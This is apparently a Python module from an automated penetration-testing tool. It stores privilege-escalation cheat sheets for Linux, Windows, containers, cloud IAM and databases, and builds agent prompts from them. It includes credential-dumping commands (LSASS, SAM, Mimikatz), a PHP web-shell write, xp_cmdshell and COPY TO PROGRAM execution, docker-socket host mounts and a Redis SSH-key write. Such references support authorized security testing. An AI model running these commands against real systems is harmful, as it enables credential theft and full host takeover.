"""Privilege escalation knowledge base.

Deep knowledge about privilege escalation:
1. Linux privilege escalation
2. Windows privilege escalation
3. Docker/container escape
4. Cloud privilege escalation
5. Database privilege escalation
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

import structlog

logger = structlog.get_logger()


@dataclass
class PrivescPattern:
    """A privilege escalation pattern."""
    pattern_id: str = ""
    name: str = ""
    category: str = ""
    severity: str = "critical"
    description: str = ""
    detection_strategy: str = ""
    tools: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.pattern_id,
            "name": self.name[:25],
            "category": self.category[:12],
        }


PRIVESC_PATTERNS: list[dict[str, Any]] = [
    {
        "id": "pe-001", "name": "Linux Privilege Escalation",
        "category": "linux", "severity": "critical",
        "desc": "Linux privilege escalation techniques.",
        "detection": (
            "LINUX PRIVILEGE ESCALATION:\n"
            "SUID/SGID:\n"
            "  find / -perm -4000 -type f 2>/dev/null  # SUID\n"
            "  find / -perm -2000 -type f 2>/dev/null  # SGID\n"
            "  # GTFOBins: https://gtfobins.github.io/\n"
            "  # Exploitable SUIDs: nmap, vim, find, bash, env, etc.\n"
            "SUDO:\n"
            "  sudo -l  # List allowed commands\n"
            "  # NOPASSWD entries\n"
            "  # GTFOBins sudo entries\n"
            "  # sudo CVEs: CVE-2021-3156 (Baron Samedit)\n"
            "  # LD_PRELOAD exploit\n"
            "KERNEL:\n"
            "  uname -a  # Kernel version\n"
            "  # DirtyPipe (CVE-2022-0847)\n"
            "  # DirtyCow (CVE-2016-5195)\n"
            "  # OverlayFS (CVE-2023-0386)\n"
            "  # nftables (CVE-2024-1086)\n"
            "CRON:\n"
            "  cat /etc/crontab\n"
            "  ls -la /etc/cron.*\n"
            "  # Writable cron scripts\n"
            "  # Wildcard injection\n"
            "  # PATH injection in cron\n"
            "CAPABILITIES:\n"
            "  getcap -r / 2>/dev/null\n"
            "  # cap_setuid: arbitrary user\n"
            "  # cap_dac_override: read any file\n"
            "  # cap_net_raw: packet capture\n"
            "WRITABLES:\n"
            "  # /etc/passwd writable → add root user\n"
            "  # /etc/shadow readable → crack passwords\n"
            "  # Service configs writable\n"
            "  # .bashrc, .profile injection\n"
            "TOOLS:\n"
            "  LinPEAS, LinEnum, linux-exploit-suggester"
        ),
        "tools": ["linpeas", "linenum"],
    },
    {
        "id": "pe-002", "name": "Windows Privilege Escalation",
        "category": "windows", "severity": "critical",
        "desc": "Windows privilege escalation techniques.",
        "detection": (
            "WINDOWS PRIVILEGE ESCALATION:\n"
            "SERVICE EXPLOITATION:\n"
            "  # Unquoted service paths\n"
            "  wmic service get name,pathname,startmode\n"
            "  # Weak service permissions\n"
            "  accesschk.exe /accepteula -uwcqv \"Users\" *\n"
            "  # DLL hijacking\n"
            "  # Service binary replacement\n"
            "TOKEN MANIPULATION:\n"
            "  # SeImpersonatePrivilege\n"
            "  whoami /priv\n"
            "  # Potato attacks: JuicyPotato, PrintSpoofer\n"
            "  # GodPotato, SweetPotato\n"
            "  PrintSpoofer.exe -i -c powershell\n"
            "REGISTRY:\n"
            "  # AlwaysInstallElevated\n"
            "  reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\n"
            "  # Autoruns in registry\n"
            "  # Stored credentials\n"
            "CREDENTIAL HARVESTING:\n"
            "  # SAM database\n"
            "  reg save hklm\\sam sam.hive\n"
            "  # LSASS dump\n"
            "  procdump -ma lsass.exe lsass.dmp\n"
            "  # Mimikatz\n"
            "  sekurlsa::logonpasswords\n"
            "  # DPAPI\n"
            "  # Credential Manager\n"
            "KERNEL:\n"
            "  systeminfo  # Patch level\n"
            "  # MS16-032, MS17-010\n"
            "  # PrintNightmare (CVE-2021-34527)\n"
            "  # HiveNightmare (CVE-2021-36934)\n"
            "UAC BYPASS:\n"
            "  # fodhelper.exe\n"
            "  # eventvwr.exe\n"
            "  # sdclt.exe\n"
            "  # UACME (56+ methods)\n"
            "TOOLS:\n"
            "  WinPEAS, Seatbelt, SharpUp, PowerUp"
        ),
        "tools": ["winpeas", "seatbelt"],
    },
    {
        "id": "pe-003", "name": "Container Escape",
        "category": "container", "severity": "critical",
        "desc": "Docker/container escape techniques.",
        "detection": (
            "CONTAINER ESCAPE:\n"
            "DOCKER:\n"
            "  # Privileged container → host\n"
            "  docker run --privileged  # Full host access\n"
            "  mount /dev/sda1 /mnt  # Mount host disk\n"
            "  chroot /mnt  # Access host filesystem\n"
            "  # Docker socket mounted\n"
            "  ls -la /var/run/docker.sock\n"
            "  docker -H unix:///var/run/docker.sock run -v /:/host alpine\n"
            "  # SYS_ADMIN capability\n"
            "  # AppArmor/SELinux disabled\n"
            "  # PID namespace sharing\n"
            "KERNEL EXPLOITS:\n"
            "  # CVE-2022-0185 (fsconfig)\n"
            "  # CVE-2022-0847 (DirtyPipe)\n"
            "  # CVE-2021-22555 (Netfilter)\n"
            "  # runc CVE-2024-21626\n"
            "KUBERNETES:\n"
            "  # Service account token\n"
            "  cat /var/run/secrets/kubernetes.io/serviceaccount/token\n"
            "  # RBAC misconfiguration\n"
            "  kubectl auth can-i --list\n"
            "  # Privileged pods\n"
            "  # hostPID, hostNetwork, hostIPC\n"
            "  # etcd access (cluster secrets)\n"
            "  # Kubelet API (10250)\n"
            "DETECTION:\n"
            "  # Am I in a container?\n"
            "  cat /proc/1/cgroup  # docker/kubepods\n"
            "  ls -la /.dockerenv\n"
            "  hostname  # Container ID\n"
            "TOOLS:\n"
            "  deepce, CDK, amicontained, kubeletctl"
        ),
        "tools": ["deepce", "cdk"],
    },
    {
        "id": "pe-004", "name": "Cloud Privilege Escalation",
        "category": "cloud", "severity": "critical",
        "desc": "Cloud IAM privilege escalation.",
        "detection": (
            "CLOUD PRIVILEGE ESCALATION:\n"
            "AWS:\n"
            "  # IAM enumeration\n"
            "  aws iam get-user\n"
            "  aws iam list-attached-user-policies --user-name USER\n"
            "  # IAM privesc paths:\n"
            "  - iam:CreatePolicyVersion (edit own policy)\n"
            "  - iam:SetDefaultPolicyVersion (activate old policy)\n"
            "  - iam:AttachUserPolicy (attach admin)\n"
            "  - iam:CreateLoginProfile (console access)\n"
            "  - iam:PassRole + lambda:CreateFunction\n"
            "  - iam:PassRole + ec2:RunInstances\n"
            "  - sts:AssumeRole (role chaining)\n"
            "  # Instance metadata\n"
            "  curl http://169.254.169.254/latest/meta-data/iam/\n"
            "  # PACU (AWS exploitation framework)\n"
            "GCP:\n"
            "  # IAM enumeration\n"
            "  gcloud projects get-iam-policy PROJECT\n"
            "  # Privesc paths:\n"
            "  - iam.serviceAccounts.actAs\n"
            "  - iam.serviceAccountKeys.create\n"
            "  - compute.instances.setMetadata\n"
            "  - deploymentmanager.deployments.create\n"
            "  # Service account impersonation\n"
            "AZURE:\n"
            "  # Role enumeration\n"
            "  az role assignment list --assignee USER\n"
            "  # Privesc paths:\n"
            "  - Automation Runbook (Run As account)\n"
            "  - Logic App (Managed Identity)\n"
            "  - VM Command Execution\n"
            "  - Key Vault access policies\n"
            "  # AAD: Global Admin, Application Admin\n"
            "TOOLS:\n"
            "  PACU, ScoutSuite, Prowler, cloudfox"
        ),
        "tools": ["pacu", "scoutsuite", "prowler"],
    },
    {
        "id": "pe-005", "name": "Database Privilege Escalation",
        "category": "database", "severity": "high",
        "desc": "Database privilege escalation techniques.",
        "detection": (
            "DATABASE PRIVILEGE ESCALATION:\n"
            "MYSQL:\n"
            "  # UDF (User Defined Function)\n"
            "  # Write .so to plugin dir\n"
            "  SELECT @@plugin_dir;\n"
            "  # INTO OUTFILE for web shell\n"
            "  SELECT '<?php system($_GET[\"c\"]);?>' INTO OUTFILE '/var/www/shell.php';\n"
            "  # File read\n"
            "  SELECT LOAD_FILE('/etc/passwd');\n"
            "  # CVE-2016-6662 (my.cnf injection)\n"
            "POSTGRESQL:\n"
            "  # Command execution\n"
            "  COPY (SELECT '') TO PROGRAM 'id';\n"
            "  # Large object\n"
            "  SELECT lo_import('/etc/passwd');\n"
            "  # Extension abuse\n"
            "  CREATE EXTENSION dblink;\n"
            "  # CVE-2019-9193 (COPY FROM PROGRAM)\n"
            "MSSQL:\n"
            "  # xp_cmdshell\n"
            "  EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;\n"
            "  EXEC xp_cmdshell 'whoami';\n"
            "  # Linked servers\n"
            "  EXEC sp_linkedservers;\n"
            "  # OPENROWSET\n"
            "  # Impersonation\n"
            "  EXECUTE AS LOGIN = 'sa';\n"
            "ORACLE:\n"
            "  # Java procedures\n"
            "  # DBMS_SCHEDULER\n"
            "  # CREATE LIBRARY (OS commands)\n"
            "  # TNS poisoning\n"
            "REDIS:\n"
            "  # Write SSH key\n"
            "  CONFIG SET dir /root/.ssh/\n"
            "  CONFIG SET dbfilename authorized_keys\n"
            "  # Write cron job\n"
            "  # Write web shell\n"
            "TOOLS:\n"
            "  sqlmap (--os-shell), PowerUpSQL, odat"
        ),
        "tools": ["sqlmap", "powerupsql", "odat"],
    },
]


class PrivilegeEscalationKB:
    """Privilege escalation knowledge base.

    Provides privesc patterns injected into agent prompts.
    """

    def __init__(self) -> None:
        self._patterns: dict[str, PrivescPattern] = {}
        self._log = logger.bind(component="privesc_kb")
        self._load_patterns()

    def _load_patterns(self) -> None:
        """Load privesc patterns."""
        for data in PRIVESC_PATTERNS:
            pattern = PrivescPattern(
                pattern_id=data["id"],
                name=data["name"],
                category=data.get("category", ""),
                severity=data.get("severity", "critical"),
                description=data.get("desc", ""),
                detection_strategy=data.get("detection", ""),
                tools=data.get("tools", []),
            )
            self._patterns[pattern.pattern_id] = pattern

    def get_by_category(self, category: str) -> list[PrivescPattern]:
        """Get patterns by category."""
        return [
            p for p in self._patterns.values()
            if p.category.lower() == category.lower()
        ]

    def build_privesc_prompt(
        self,
        categories: list[str] | None = None,
        max_patterns: int = 4,
    ) -> str:
        """Build privilege escalation prompt."""
        lines = ["## Privilege Escalation\n"]
        count = 0
        for pattern in self._patterns.values():
            if categories and pattern.category.lower() not in [c.lower() for c in categories]:
                continue
            if count >= max_patterns:
                break
            lines.append(f"### {pattern.name} [{pattern.category.upper()}]")
            lines.append(pattern.detection_strategy)
            lines.append("")
            count += 1
        return "\n".join(lines)

    def get_stats(self) -> dict[str, Any]:
        cat_counts: dict[str, int] = {}
        for p in self._patterns.values():
            cat_counts[p.category] = cat_counts.get(p.category, 0) + 1
        return {
            "patterns": len(self._patterns),
            "by_category": cat_counts,
        }
